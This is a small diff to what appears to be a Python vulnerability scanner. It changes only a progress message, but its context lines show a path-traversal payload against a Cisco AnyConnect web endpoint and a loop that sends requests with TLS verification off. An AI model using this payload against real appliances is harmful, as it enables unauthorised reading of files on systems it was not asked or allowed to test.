@@ -11,7 +11,7 @@ PAYLOAD2="/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resourc
 
 
 def check_url(url, count, total):
-    print(f"Trying {count}/{total}: {url}" + (" " * 15), end='\r', file=sys.stderr)
+    print(f"Trying {count}/{total}" + (" " * 6), end='\r', file=sys.stderr)
     try:
         r = requests.get(url, timeout=1, verify=False)
         if r.status_code == 200:
